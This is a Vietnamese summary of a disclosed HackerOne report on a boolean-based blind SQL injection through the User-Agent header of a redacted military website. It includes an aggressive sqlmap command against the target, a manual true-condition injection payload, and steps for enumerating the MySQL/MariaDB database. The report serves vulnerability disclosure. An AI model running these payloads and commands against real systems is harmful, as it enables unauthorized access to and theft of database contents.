# https://hackerone.com/reports/2599826
---

## 🎯 Báo cáo Lỗ hổng SQLi mù qua tiêu đề User-Agent

**Mục tiêu**: https\://█████████.mil/
**Mã báo cáo**: #2599826
**Trạng thái**: Đã xác minh → Đã phân loại → Đã giải quyết
**Mức độ nghiêm trọng**: Trung bình (4 \~ 6.9)
**Loại lỗ hổng**: Boolean-based Blind SQL Injection
**Được công bố**: 24/01/2025
**Người báo cáo**: iamunixtz

---

### 🧠 Tóm tắt

Phát hiện một lỗ hổng **Boolean-based Blind SQL Injection** thông qua tiêu đề `User-Agent`. Cho phép kẻ tấn công trích xuất thông tin từ cơ sở dữ liệu backend mà không cần phản hồi lỗi rõ ràng.

---

### 🧪 PoC & Quy trình khai thác

**1️⃣ Kiểm tra với SQLMap:**

```bash
sqlmap --url=https://█████████.mil/ --random-agent --risk=3 --level=5 --batch
```

**2️⃣ Tải trọng thủ công (boolean true):**

```http
User-Agent: Mozilla/... Safari/523.10' AND 8074=8074-- KwOG
```

**3️⃣ Phản hồi ứng dụng khác biệt khi điều kiện đúng/sai → xác nhận SQLi mù.**

**4️⃣ Khai thác:**

* Dùng `sqlmap` để enumerate DB (DBMS: MySQL 8 - MariaDB fork)
* Cũng có thể thủ công qua Burp Repeater + binary search (1 bit/time)

---

